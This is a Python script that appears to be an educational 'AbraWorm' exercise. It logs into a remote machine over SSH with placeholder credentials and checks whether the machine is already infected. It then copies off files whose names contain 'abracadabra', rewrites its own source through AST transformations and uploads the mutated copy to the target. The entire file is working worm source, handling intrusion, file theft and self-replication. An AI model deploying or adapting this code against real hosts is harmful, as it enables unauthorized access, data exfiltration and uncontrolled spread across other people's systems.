import sys
import os
import random
import paramiko
import scp
import signal
import re
import shutil as sh
import ast
import astor


def sig_handler(signum, frame):
    os.kill(os.getpid(), signal.SIGKILL)


signal.signal(signal.SIGINT, sig_handler)


files_of_interest_at_target = []


def infect():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect("<IP>", port=22, username="<usr>", password="<pass>", timeout=5)
    print("\n\nconnected\n")

    stdin, stdout, stderr = ssh.exec_command("cd <Dir>; ls")
    received_list = list(map(lambda x: str(x.strip()), stdout.readlines()))
    print("\n\noutput of 'ls' command: %s" % str(received_list))

    if "".join(received_list).find("AbraWorm") >= 0:
        print("\nThe target machine is already infected\n")
        return

    # Now let's look for files that contain the string 'abracadabra'
    cmd = "ls | grep abracadabra"
    stdin, stdout, stderr = ssh.exec_command(cmd)
    error = stderr.readlines()

    if error != []:
        print(error)
        # continue

    received_list = list(map(lambda x: x.encode("utf-8"), stdout.readlines()))
    for item in received_list:
        files_of_interest_at_target.append(item.strip())

    print("\nfiles of interest at the target: %s" % str(files_of_interest_at_target))

    scpcon = scp.SCPClient(ssh.get_transport())

    if len(files_of_interest_at_target) > 0:
        for target_file in files_of_interest_at_target:
            scpcon.get(target_file)

    print("Replicating Worm...")

    # Read contents of file into memory
    with open(sys.argv[0], "r") as f:
        contents = f.read()

    # Modify the code using Python's AST module
    tree = ast.parse(contents)

    # Define regex pattern to match comment blocks
    comment_pattern = r"(^\s*#.*$)"

    class LoopTransformer(ast.NodeTransformer):
        def visit_For(self, node):
            node.iter = ast.Call(func=ast.Name(id='reversed', ctx=ast.Load()),
                                 args=[node.iter], keywords=[])
            return node

        def visit_While(self, node):
            node.test = ast.NameConstant(value=False)
            return node

    class FuncTransformer(ast.NodeTransformer):
        def visit_FunctionDef(self, node):
            node.name = node.name + '_modified'
            return node

    transformer = ast.fix_missing_locations(ast.copy_location(FuncTransformer().visit(LoopTransformer().visit(tree)), tree))

    # Convert the modified AST back to source code
    modified_code = astor.to_source(transformer)

    OUT = open("Abra.py", "w")
    OUT.write(modified_code)
    OUT.close()

    scpcon.put("Abra.py", "<target>")
    scpcon.close()


infect()
